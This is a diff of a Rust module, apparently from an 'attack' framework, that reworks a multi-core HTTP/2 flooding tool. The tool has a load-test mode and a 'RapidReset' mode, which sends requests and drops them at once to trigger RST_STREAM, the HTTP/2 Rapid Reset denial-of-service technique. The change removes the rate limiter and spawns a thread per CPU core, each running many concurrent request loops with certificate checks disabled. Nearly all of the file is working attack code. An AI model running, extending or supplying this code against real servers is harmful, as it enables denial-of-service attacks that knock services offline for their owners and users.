@@ -1,19 +1,19 @@
 //! Universal Auto-Adaptive HTTP/2 Attack Module
 //!
-//! Architecture for maximum throughput:
-//! - Single reqwest Client with HTTP/2 connection pool
-//! - N concurrent tokio tasks, each looping as fast as possible
-//! - Tokio multi-thread runtime uses ALL cores on attack machine
-//! - reqwest handles: HPACK, flow control, connection multiplexing, TLS
-//! - No manual h2 stream management = no deadlocks
+//! Architecture:
+//! - Spawn 1 OS thread per CPU core — true parallelism, no scheduler contention
+//! - Each thread: own tokio current-thread runtime + own reqwest client + own connection pool
+//! - Each client: N connections per host, each HTTP/2 multiplexed
+//! - Each connection: M concurrent async tasks hammering requests
+//!
+//! Result: cores × connections × streams concurrent requests with zero contention
 
 use std::sync::Arc;
-use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::time::{Duration, Instant};
 
 use reqwest::Client;
-use tokio::sync::Semaphore;
-use tracing::{error, info, warn};
+use tracing::info;
 
 use phoenix_metrics::AttackMetrics;
 use crate::{Attack, AttackContext, AttackError, AttackResult};
@@ -23,14 +23,14 @@ pub enum UniversalMode { LoadTest, RapidReset }
 
 pub struct UniversalAttack {
     pub mode:        UniversalMode,
-    pub connections: usize,   // concurrent task count
+    pub connections: usize,  // connections per thread
     pub duration:    Duration,
     pub rps:         Option<u32>,
 }
 
 impl UniversalAttack {
-    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 1000, duration: Duration::from_secs(30), rps: None } }
-    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 1000, duration: Duration::from_secs(30), rps: None } }
+    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 50, duration: Duration::from_secs(30), rps: None } }
+    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 50, duration: Duration::from_secs(30), rps: None } }
     pub fn with_connections(mut self, n: usize)  -> Self { self.connections = n; self }
     pub fn with_duration(mut self, d: Duration)  -> Self { self.duration    = d; self }
     pub fn with_rps(mut self, r: u32)            -> Self { self.rps         = Some(r); self }
@@ -38,124 +38,135 @@ impl UniversalAttack {
 
 #[async_trait::async_trait]
 impl Attack for UniversalAttack {
-    fn name(&self) -> &str {
-        match self.mode {
-            UniversalMode::LoadTest   => "universal-load-test",
-            UniversalMode::RapidReset => "universal-rapid-reset",
-        }
-    }
+    fn name(&self) -> &str { "universal" }
     fn description(&self) -> &str {
-        "High-throughput HTTP/2 attack using reqwest connection pool + concurrent async tasks"
+        "Multi-core HTTP/2 attack: 1 thread/core × N connections × M tasks"
     }
 
     async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
-        let target      = ctx.target.clone();
-        let duration    = self.duration;
-        let concurrency = self.connections.max(1);
-        let metrics     = ctx.metrics.clone();
-        let mode        = self.mode.clone();
+        let target           = ctx.target.clone();
+        let duration         = self.duration;
+        let conns_per_thread = self.connections.max(1);
+        let metrics          = ctx.metrics.clone();
+        let mode             = self.mode.clone();
+        let n_cores          = num_cpus::get();
 
-        info!("Building HTTP/2 client...");
+        // Tasks per connection — how many concurrent async loops per h2 connection
+        let tasks_per_conn: usize = 20;
 
-        // Single client — reqwest manages connection pool internally
-        // HTTP/2 multiplexes many streams per connection automatically
-        let client = Client::builder()
-            .http2_prior_knowledge()
-            .danger_accept_invalid_certs(true)
-            .http2_initial_stream_window_size(1u32 << 21)      // 2MB stream window
-            .http2_initial_connection_window_size(1u32 << 24)  // 16MB conn window
-            .http2_adaptive_window(true)
-            .tcp_nodelay(true)
-            .timeout(Duration::from_secs(5))
-            .pool_max_idle_per_host(concurrency)
-            .pool_idle_timeout(Duration::from_secs(30))
-            .build()
-            .map_err(|e| AttackError::Config(format!("Client build failed: {}", e)))?;
+        info!(
+            "Launching: {} cores × {} conns × {} tasks = {} concurrent",
+            n_cores, conns_per_thread, tasks_per_conn,
+            n_cores * conns_per_thread * tasks_per_conn
+        );
 
-        let client = Arc::new(client);
+        let ok_total  = Arc::new(AtomicU64::new(0));
+        let err_total = Arc::new(AtomicU64::new(0));
+        let stop      = Arc::new(AtomicBool::new(false));
+        let start     = Instant::now();
 
-        // Probe once to confirm connectivity
-        info!("Probing {}...", target);
-        match client.get(&target).send().await {
-            Ok(r) => info!("Probe OK — status={} version={:?}", r.status(), r.version()),
-            Err(e) => warn!("Probe failed: {} — continuing anyway", e),
-        }
+        // Spawn one OS thread per core — each has its own tokio runtime + client
+        let mut thread_handles = Vec::with_capacity(n_cores);
 
-        // Shared atomic counters
-        let ok_count  = Arc::new(AtomicU64::new(0));
-        let err_count = Arc::new(AtomicU64::new(0));
+        for _core in 0..n_cores {
+            let target      = target.clone();
+            let ok_c        = ok_total.clone();
+            let err_c       = err_total.clone();
+            let stop_c      = stop.clone();
+            let metrics_c   = metrics.clone();
+            let mode        = mode.clone();
 
-        // Rate limiter: optional semaphore-based token bucket
-        let rate_sem: Option<Arc<Semaphore>> = self.rps.map(|rps| {
-            Arc::new(Semaphore::new(rps as usize))
-        });
+            let handle = std::thread::spawn(move || {
+                let rt = tokio::runtime::Builder::new_current_thread()
+                    .enable_all()
+                    .build()
+                    .expect("tokio rt");
 
-        info!("Firing {} concurrent tasks for {:?}...", concurrency, duration);
+                rt.block_on(async move {
+                    // Each thread: own client with its own connection pool
+                    let client = match Client::builder()
+                        .http2_prior_knowledge()
+                        .danger_accept_invalid_certs(true)
+                        .http2_initial_stream_window_size(1u32 << 21)
+                        .http2_initial_connection_window_size(1u32 << 24)
+                        .http2_adaptive_window(true)
+                        .tcp_nodelay(true)
+                        .timeout(Duration::from_secs(5))
+                        .pool_max_idle_per_host(conns_per_thread * 2)
+                        .pool_idle_timeout(Duration::from_secs(60))
+                        .build()
+                    {
+                        Ok(c) => Arc::new(c),
+                        Err(_) => return,
+                    };
 
-        let start = Instant::now();
-        let mut handles = Vec::with_capacity(concurrency);
+                    // Warm up connections
+                    let _ = client.get(&target).send().await;
 
-        for _ in 0..concurrency {
-            let client    = client.clone();
-            let target    = target.clone();
-            let metrics   = metrics.clone();
-            let ok_c      = ok_count.clone();
-            let err_c     = err_count.clone();
-            let mode      = mode.clone();
-            let rate_sem  = rate_sem.clone();
+                    let mut tasks = Vec::new();
 
-            handles.push(tokio::spawn(async move {
-                while start.elapsed() < duration {
-                    // Rate limiting
-                    if let Some(ref sem) = rate_sem {
-                        let _permit = sem.acquire().await;
-                        // Token refill handled by separate task (simplified: just acquire)
-                    }
+                    // Spawn conns_per_thread × tasks_per_conn async loops
+                    for _ in 0..conns_per_thread * tasks_per_conn {
+                        let client  = client.clone();
+                        let target  = target.clone();
+                        let ok_c    = ok_c.clone();
+                        let err_c   = err_c.clone();
+                        let stop_c  = stop_c.clone();
+                        let metrics = metrics_c.clone();
+                        let mode    = mode.clone();
 
-                    match mode {
-                        UniversalMode::LoadTest => {
-                            let t0 = Instant::now();
-                            match client.get(&target).send().await {
-                                Ok(resp) => {
-                                    let status  = resp.status().as_u16();
-                                    let success = status < 400;
-                                    // Consume body to release flow control window
-                                    let _ = resp.bytes().await;
-                                    let lat = t0.elapsed().as_micros() as u64;
-                                    metrics.record_request(lat, success, 0).await;
-                                    if success { ok_c.fetch_add(1, Ordering::Relaxed); }
-                                    else       { err_c.fetch_add(1, Ordering::Relaxed); }
-                                }
-                                Err(e) => {
-                                    if !e.is_timeout() {
-                                        err_c.fetch_add(1, Ordering::Relaxed);
+                        tasks.push(tokio::spawn(async move {
+                            while !stop_c.load(Ordering::Relaxed) {
+                                match mode {
+                                    UniversalMode::LoadTest => {
+                                        let t0 = Instant::now();
+                                        match client.get(&target).send().await {
+                                            Ok(resp) => {
+                                                let ok = resp.status().as_u16() < 400;
+                                                let _ = resp.bytes().await;
+                                                let lat = t0.elapsed().as_micros() as u64;
+                                                metrics.record_request(lat, ok, 0).await;
+                                                if ok { ok_c.fetch_add(1, Ordering::Relaxed); }
+                                                else  { err_c.fetch_add(1, Ordering::Relaxed); }
+                                            }
+                                            Err(_) => { err_c.fetch_add(1, Ordering::Relaxed); }
+                                        }
+                                    }
+                                    UniversalMode::RapidReset => {
+                                        match client.get(&target).send().await {
+                                            Ok(_) => {
+                                                metrics.record_request(0, true, 0).await;
+                                                ok_c.fetch_add(1, Ordering::Relaxed);
+                                            }
+                                            Err(_) => { err_c.fetch_add(1, Ordering::Relaxed); }
+                                        }
                                     }
                                 }
                             }
-                        }
-                        UniversalMode::RapidReset => {
-                            // Send request then immediately drop — triggers RST_STREAM
-                            match client.get(&target).send().await {
-                                Ok(_resp) => {
-                                    // drop response immediately = RST_STREAM
-                                    metrics.record_request(0, true, 0).await;
-                                    ok_c.fetch_add(1, Ordering::Relaxed);
-                                }
-                                Err(_) => { err_c.fetch_add(1, Ordering::Relaxed); }
-                            }
-                        }
+                        }));
                     }
-                }
-            }));
+
+                    // Wait for duration then signal stop
+                    tokio::time::sleep(duration).await;
+                    stop_c.store(true, Ordering::Relaxed);
+
+                    for t in tasks { t.abort(); }
+                });
+            });
+
+            thread_handles.push(handle);
         }
 
-        for h in handles { let _ = h.await; }
+        // Wait for all threads to finish
+        for h in thread_handles {
+            let _ = h.join();
+        }
 
         let elapsed = start.elapsed();
-        let ok  = ok_count.load(Ordering::Relaxed);
-        let err = err_count.load(Ordering::Relaxed);
-        let total = ok + err;
-        let rps = total as f64 / elapsed.as_secs_f64();
+        let ok      = ok_total.load(Ordering::Relaxed);
+        let err     = err_total.load(Ordering::Relaxed);
+        let total   = ok + err;
+        let rps     = total as f64 / elapsed.as_secs_f64();
 
         info!("Done: {} ok / {} err in {:.1}s = {:.0} rps", ok, err, elapsed.as_secs_f64(), rps);
 
